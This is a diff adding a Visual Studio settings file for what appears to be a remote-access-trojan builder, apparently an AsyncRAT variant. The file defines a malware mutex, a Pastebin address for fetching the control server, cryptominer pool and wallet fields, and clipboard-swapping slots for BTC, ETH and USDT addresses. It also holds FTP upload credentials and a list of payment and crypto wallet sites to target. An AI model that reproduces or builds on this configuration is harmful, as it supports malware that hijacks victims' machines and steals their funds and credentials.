@@ -1,0 +1,93 @@
+﻿<?xml version='1.0' encoding='utf-8'?>
+<SettingsFile CurrentProfile="(Default)" GeneratedClassNamespace="Server.Properties" GeneratedClassName="Settings" xmlns="http://schemas.microsoft.com/VisualStudio/2004/01/settings">
+  <Profiles />
+  <Settings>
+    <Setting Name="Ports" Type="System.String" Scope="User">
+      <Value Profile="(Default)"></Value>
+    </Setting>
+    <Setting Name="Filename" Type="System.String" Scope="User">
+      <Value Profile="(Default)"></Value>
+    </Setting>
+    <Setting Name="Notification" Type="System.Boolean" Scope="User">
+      <Value Profile="(Default)">True</Value>
+    </Setting>
+    <Setting Name="Mutex" Type="System.String" Scope="User">
+      <Value Profile="(Default)">AsyncMutex_alosh</Value>
+    </Setting>
+    <Setting Name="Pastebin" Type="System.String" Scope="User">
+      <Value Profile="(Default)">https://pastebin.com/raw/s14cUU5G</Value>
+    </Setting>
+    <Setting Name="IP" Type="System.String" Scope="User">
+      <Value Profile="(Default)"></Value>
+    </Setting>
+    <Setting Name="ProductName" Type="System.String" Scope="User">
+      <Value Profile="(Default)"></Value>
+    </Setting>
+    <Setting Name="txtDescription" Type="System.String" Scope="User">
+      <Value Profile="(Default)"></Value>
+    </Setting>
+    <Setting Name="txtCompany" Type="System.String" Scope="User">
+      <Value Profile="(Default)"></Value>
+    </Setting>
+    <Setting Name="txtCopyright" Type="System.String" Scope="User">
+      <Value Profile="(Default)"></Value>
+    </Setting>
+    <Setting Name="txtTrademarks" Type="System.String" Scope="User">
+      <Value Profile="(Default)"></Value>
+    </Setting>
+    <Setting Name="txtOriginalFilename" Type="System.String" Scope="User">
+      <Value Profile="(Default)"></Value>
+    </Setting>
+    <Setting Name="txtProductVersion" Type="System.String" Scope="User">
+      <Value Profile="(Default)">0.0.0.0</Value>
+    </Setting>
+    <Setting Name="txtFileVersion" Type="System.String" Scope="User">
+      <Value Profile="(Default)">0.0.0.0</Value>
+    </Setting>
+    <Setting Name="txtPool" Type="System.String" Scope="User">
+      <Value Profile="(Default)"></Value>
+    </Setting>
+    <Setting Name="txtWallet" Type="System.String" Scope="User">
+      <Value Profile="(Default)"></Value>
+    </Setting>
+    <Setting Name="txtxmrPass" Type="System.String" Scope="User">
+      <Value Profile="(Default)"></Value>
+    </Setting>
+    <Setting Name="txtBlocked" Type="System.String" Scope="User">
+      <Value Profile="(Default)">listBlocked</Value>
+    </Setting>
+    <Setting Name="Group" Type="System.String" Scope="User">
+      <Value Profile="(Default)">Default</Value>
+    </Setting>
+    <Setting Name="proxyhost" Type="System.String" Scope="User">
+      <Value Profile="(Default)">127.0.0.1</Value>
+    </Setting>
+    <Setting Name="proxyport" Type="System.String" Scope="User">
+      <Value Profile="(Default)">8090</Value>
+    </Setting>
+    <Setting Name="btc" Type="System.String" Scope="User">
+      <Value Profile="(Default)">BTC Address</Value>
+    </Setting>
+    <Setting Name="eth" Type="System.String" Scope="User">
+      <Value Profile="(Default)">ETH Address</Value>
+    </Setting>
+    <Setting Name="usdt" Type="System.String" Scope="User">
+      <Value Profile="(Default)">Trc20 Address</Value>
+    </Setting>
+    <Setting Name="ftpuser" Type="System.String" Scope="User">
+      <Value Profile="(Default)">ftp-username</Value>
+    </Setting>
+    <Setting Name="ftppass" Type="System.String" Scope="User">
+      <Value Profile="(Default)">ftp-password</Value>
+    </Setting>
+    <Setting Name="ftpport" Type="System.String" Scope="User">
+      <Value Profile="(Default)">21</Value>
+    </Setting>
+    <Setting Name="ftphost" Type="System.String" Scope="User">
+      <Value Profile="(Default)">ftp.exmple.com</Value>
+    </Setting>
+    <Setting Name="sites" Type="System.String" Scope="User">
+      <Value Profile="(Default)">paypal,binance,coinbase,phantom,exodus,atomic,metamask,blockchain,bitkub,bittrex,kraken,paxful,coinmama,bitcoin,wallet,tronlink</Value>
+    </Setting>
+  </Settings>
+</SettingsFile>
